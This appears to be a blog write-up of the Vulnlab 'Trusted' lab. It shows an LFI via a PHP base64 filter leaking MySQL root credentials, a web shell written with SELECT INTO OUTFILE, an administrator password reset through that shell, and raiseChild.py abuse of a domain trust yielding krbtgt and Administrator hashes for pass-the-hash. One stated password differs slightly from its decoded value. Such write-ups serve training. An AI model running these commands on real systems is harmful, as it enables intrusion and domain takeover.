+++
title = '[Vulnlab] Trusted'
date = 2024-10-02T00:40:44+02:00
draft = false
+++

[![Proof](/images/vulnlab_trusted.png)](https://api.vulnlab.com/api/v1/share?id=4598b403-cd91-441e-bb38-584529f92823)


# Summary
A chain with two domains: `labdc.trusted.vl` and `trusted.vl`
1. *XAMPP* Web server - Dir busting finds hidden `/dev` Web service
2. Local File inclusion reading MySQL credentials via PHP base64 filter in `db.php`
3. MySQL to write Web shell on *XAMPP* Server → Domain admin on `labdc.trusted.vl`
4. Abuse Domain trust via `raiseChild.py` to get Domain admin on `trusted.vl`


## Tools used
```
netexec
dnschef-ng
feroxbuster
ffuf
mssql-client
evil-winrm
impacket
bloodhound
python-bloodhound
```
Nice to have
```
Burp Pro
```

## Relevant ports
```
Nmap scan report for TRUSTEDDC.trusted.vl (10.10.250.53)
PORT      STATE SERVICE
88/tcp    open  kerberos-sec    # <- This is DC
445/tcp   open  microsoft-ds    # SMB for enumeration
3389/tcp  open  ms-wbt-server   # RDP to bypass file encryption

Nmap scan report for LABDC.lab.trusted.vl (10.10.250.54)
PORT      STATE SERVICE
80/tcp    open  http            # HTTP -> Info disclosure
88/tcp    open  kerberos-sec    # <- This is DC
389/tcp   open  ldap            # LDAP -> Bloodhound
445/tcp   open  microsoft-ds    # SMB
3306/tcp  open  mysql           # MYSQL -> Code execution via webshell
```

## Relevant gathered information
* Website is using XAMMP → Known File path to deploy web shell
* Password to MySQL database - leaked via LFI


# Walkthrough
We start by inputting the target machines into a `ips.txt` file:
```bash
cat ips.txt 
10.10.250.53
10.10.250.54
```

First we figure out the name of the machines:
```bash
nxc smb ips.txt
SMB         10.10.250.54    445    LABDC            [*] Windows Server 2022 Build 20348 x64 (name:LABDC) (domain:lab.trusted.vl) (signing:True) (SMBv1:False)
SMB         10.10.250.53    445    TRUSTEDDC        [*] Windows Server 2022 Build 20348 x64 (name:TRUSTEDDC) (domain:trusted.vl) (signing:True) (SMBv1:False)
```

Now we add these names to `/etc/hosts` to not type in IP-addresses all the time. 
It's also an important step to make `raiseChild.py` work properly later.

```
tail -4 /etc/hosts
10.10.250.53	trusted.vl
10.10.250.53	trusteddc.trusted.vl
10.10.250.54    lab.trusted.vl
10.10.250.54    labdc.lab.trusted.vl
```

## Port Scan
```
sudo nmap -p- -iL ips.txt -v -oA full -T 4
[Truncated output for writeup]
Nmap scan report for TRUSTEDDC.trusted.vl (10.10.250.53)
PORT      STATE SERVICE
88/tcp    open  kerberos-sec
389/tcp   open  ldap
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman

Nmap scan report for LABDC.lab.trusted.vl (10.10.250.54)
PORT      STATE SERVICE
80/tcp    open  http
88/tcp    open  kerberos-sec
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
```

Port 389 and 445 could contain interesting information via `LDAP` and `SMB` enumeration, but they don't.

Port 88 tells us they are both domain controllers. 

Port 3389 and 5985 give us access via winrm or RDP if we gain credentials. 
This leaves Port 80, 443 and 3306 on `LABDC.lab.trusted.vl`.

## LABDC compromise
Since I'm using a setup to use Burp via SOCKS proxy, I'm running `dnschef` now to fake a DNS entry. 
But this is also important to do before running `python-bloodhound`

The `--fakeip` parameter should point to `LABDC.lab.trusted.vl`
```
sudo sysctl net.ipv4.ip_unprivileged_port_start=53
dnschef-ng --fakeip 10.10.250.54
```

### 80,443 - Web server
The Website shows that we are using *XAMPP* with MariaDB and PHP:
![Dashboard showing that LABDC is running MariaDB + PHP](/images/vulnlab_trusted/labdc_dashboard.png)

#### Directory bruteforce
Since there is nothing interesting on the main site it's important to do some dirbusting:
```bash {hl_lines=[7]}
feroxbuster -u http://labdc.lab.trusted.vl
[...]
403      GET        9l       30w      309c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       33w      306c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://labdc.lab.trusted.vl/ => http://labdc.lab.trusted.vl/dashboard/
301      GET        9l       30w      350c http://labdc.lab.trusted.vl/img => http://labdc.lab.trusted.vl/img/
301      GET        9l       30w      350c http://labdc.lab.trusted.vl/dev => http://labdc.lab.trusted.vl/dev/
[...]
```

We immediately find a subdirectory `/dev` which looks interesting:

![Hidden Dev Portal](/images/vulnlab_trusted/labdc_dev.png)

#### Local File inclusion via `view` parameter

There is a hint at the bottom:
> Eric please take a look at this if you have the time. I tried to implement some php code and set up the database connection but it doesn't seem to work. Could you fix it please? 

At this point, we can run a Burp Professional Web application scan to check if there are any easy vulnerabilities. (The Vulnerability can also be found manually, but I'm lazy).
![Burp Scan](/images/vulnlab_trusted/burp_scan_settings.png)

The scan reveals a Path traversal Vulnerability in the `view` parameter:
![Burp Scan - Path traversal result](/images/vulnlab_trusted/burp_path_traversal.png)

Since the hint mentioned a Database connection, we want to enumerate the current folder, the `-fw 55,58` filters are in place to ignore errors.

```bash {hl_lines=[6]}
ffuf -u http://labdc.lab.trusted.vl/dev/index.html?view=FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -fw 55,58 -o fuff-out
index.html              [Status: 200, Size: 2311, Words: 132, Lines: 80, Duration: 26ms]
contact.html            [Status: 200, Size: 2708, Words: 108, Lines: 105, Duration: 36ms]
.htaccess               [Status: 200, Size: 783, Words: 28, Lines: 31, Duration: 43ms]
about.html              [Status: 200, Size: 1918, Words: 80, Lines: 71, Duration: 68ms]
db.php                  [Status: 200, Size: 763, Words: 26, Lines: 31, Duration: 50ms]
Contact.html            [Status: 200, Size: 2708, Words: 108, Lines: 105, Duration: 215ms]
system.php              [Status: 200, Size: 892, Words: 47, Lines: 32, Duration: 34ms]
table.php               [Status: 200, Size: 1185, Words: 67, Lines: 38, Duration: 40ms]
Index.html              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 36ms]
About.html              [Status: 200, Size: 1918, Words: 80, Lines: 71, Duration: 38ms]
PEAR.php                [Status: 200, Size: 741, Words: 25, Lines: 31, Duration: 27ms]
```

`db.php` looks interesting, however since it is a PHP file, it gets executed. 
To access the source we can use the base64 PHP wrapper: `php://filter/read=convert.base64-encode/resource=TARGET`
The URL is therefore:
```html {hl_lines=[15]}
curl http://labdc.lab.trusted.vl/dev/index.html?view=php://filter/read=convert.base64-encode/resource=db.php

<!DOCTYPE HTML>
<!-- Website template by freewebsitetemplates.com -->
<html>
<head>
	<meta charset="UTF-8">
	<title>Law Firm</title>
	<link rel="stylesheet" href="css/style.css" type="text/css">
</head>
<body>
	<div id="header">
		[...]
	</div>
<p>PD9waHAgDQokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIlN1cGVyU2VjdXJlTXlTUUxQYXNzdzByZDEzMzcuIjsNCg0KJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkc2VydmVybmFtZSwgJHVzZXJuYW1lLCAkcGFzc3dvcmQpOw0KDQppZiAoISRjb25uKSB7DQogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsNCn0NCmVjaG8gIkNvbm5lY3RlZCBzdWNjZXNzZnVsbHkiOw0KPz4=</p></body>
</html>
```
Decoded this reveals the database password `SecureMySQLPassw0rd1337.`

```php
echo PD9waHAgDQokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIlN1cGVyU2VjdXJlTXlTUUxQYXNzdzByZDEzMzcuIjsNCg0KJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkc2VydmVybmFtZSwgJHVzZXJuYW1lLCAkcGFzc3dvcmQpOw0KDQppZiAoISRjb25uKSB7DQogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsNCn0NCmVjaG8gIkNvbm5lY3RlZCBzdWNjZXNzZnVsbHkiOw0KPz4= | base64 -d
<?php 
$servername = "localhost";
$username = "root";
$password = "SuperSecureMySQLPassw0rd1337.";

$conn = mysqli_connect($servername, $username, $password);

if (!$conn) {
  die("Connection failed: " . mysqli_connect_error());
}
echo "Connected successfully";
?>
```

### 3306 - MySQL
We connect to the MySQL database:
```sql
mysql -h labdc.lab.trusted.vl -u root -p
Enter password: SuperSecureMySQLPassw0rd1337.
Welcome to the MariaDB monitor.
[...]

MariaDB [(none)]> 
```
Enumerating our DB privileges shows that we have all privileges
```sql
MariaDB [(none)]> show grants;
+--------------------------------------------------------------------------------------------------------------------------------+
| Grants for root@%                                                                                                              |
+--------------------------------------------------------------------------------------------------------------------------------+
| GRANT ALL PRIVILEGES ON *.* TO `root`@`%` IDENTIFIED BY PASSWORD '*665C8B0E1F0044B6A95EF22E82B93B3350F38A01' WITH GRANT OPTION |
+--------------------------------------------------------------------------------------------------------------------------------+
```
This includes the `FILE` privilege allowing us to write to any path the `mariadb` has access to.
We abuse this to deploy a web shell:
```sql
MariaDB [(none)]> select '<?php echo "command: " . system($_REQUEST["cmd"]); ?>' into outfile "C:\\*XAMPP*\\htdocs\\shell.php";
Query OK, 1 row affected (0.028 sec)
```
#### Persistence
Triggering the webshell reveals that we are running as `SYSTEM`:
```
curl http://labdc.lab.trusted.vl/shell.php?cmd=whoami
nt authority\system
command: nt authority\system
```
For persistence, we change the admin password:
```bash
curl http://labdc.lab.trusted.vl/shell.php?cmd=net+user+administrator+"Password1234$"
The command completed successfully.

command: 
```

### 5895 - Code Execution
```powershell
evil-winrm -i labdc.lab.trusted.vl -u administrator -p Password1234$
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/user.txt
VL{********************************}

```

## Compromising Domain trusted.vl
At this point we have compromised the `lab.trusted.vl` Domain. Now we want to compromise the other domain `trusted.vl`. 
For that we use `bloodhound` to enumerate the connection between the domains:

**Troubleshooting** To make all the tools work, remember to set up `dnschef-ng` and `/etc/hosts` as described earlier in the write-up.

Run `bloodhound-python` to gather information
```bash
bloodhound-python -u $(<user) -p $(<pass) -d lab.trusted.vl -dc labdc.lab.trusted.vl -ns 127.0.0.1 -c all --zip

WARNING: Could not find a global catalog server, assuming the primary DC has this role
If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
INFO: Getting TGT for user
INFO: Connecting to LDAP server: labdc.lab.trusted.vl
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 1 computers
[...]
```

Bloodhound, using the `Analysis->Map Domain Trust` shows that `trusted.vl` trusts `labdc.lab.trusted.vl`:
![Domain Trust](/images/vulnlab_trusted/bloodhound_trust.png)


This means that we can take over the domain via the `impacket` function `raiseChild.py`:


```bash {hl_lines=[15]}
raiseChild.py lab.trusted.vl/$(<user):$(<pass)
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Raising child domain lab.trusted.vl
[*] Forest FQDN is: trusted.vl
[*] Raising lab.trusted.vl to trusted.vl
[*] trusted.vl Enterprise Admin SID is: S-1-5-21-3576695518-347000760-3731839591-519
[*] Getting credentials for lab.trusted.vl
lab.trusted.vl/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c7a03c565c68c6fac5f8913fab576ebd:::
lab.trusted.vl/krbtgt:aes256-cts-hmac-sha1-96s:c930ddb15c3f84aafa01e816abc1112e38430b574ae3fcdd019e77bc906494aa
[*] Getting credentials for trusted.vl
trusted.vl/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d9436aebee2db5c6e4166d5e2472fa2d:::
trusted.vl/krbtgt:aes256-cts-hmac-sha1-96s:3e5bc8a7d01388cdaf4ab8541f4e360d4fd9089723cedfd08f8016b7900ba2bf
[*] Target User account name is Administrator
trusted.vl/Administrator:500:aad3b435b51404eeaad3b435b51404ee:15db914be1e6a896e7692f608a9d72ef:::
trusted.vl/Administrator:aes256-cts-hmac-sha1-96s:d75ec7df1acac724a6dfc250e707aab3492b6d9936b9898f742781b0a871d4a6
```

### Getting the flag
Using the NTLM-Hash of the Administrator, we can connect to the machine
```powershell
evil-winrm -i trusteddc.trusted.vl -u administrator -H 15db914be1e6a896e7692f608a9d72ef
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

However, we are unable to open `root.txt`
```
PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
Access to the path 'C:\Users\Administrator\Desktop\root.txt' is denied.
At line:1 char:1
+ cat ../Desktop/root.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop\root.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand

```

In such cases it's useful to check out the remote desktop to easily see the problem. We first set the password:

```powershell
C:\Users\Administrator\Documents> net user administrator "Password1234$"
```

Then connect via `xfreerdp`:

```bash
xfreerdp /v:10.10.250.53 /u:Administrator /p:"Password1234$"
```
On the remote desktop the file can be opened normally:

![Opening the Flag on the remote desktop is easy](/images/vulnlab_trusted/remote_desktop_rootflag.png)


# Vulnerabilities and Misconfigurations
1. Local File Inclusion on `labdc.lab.trusted.vl/dev` → `view` parameter
2. MySQL user running with high privileges
3. Domain trust between `lab.trusted.vl` and `trusted.vl`


# Notes
The web shell seems unintended. There seems to be another path via leaked credentials in the MySQL database.
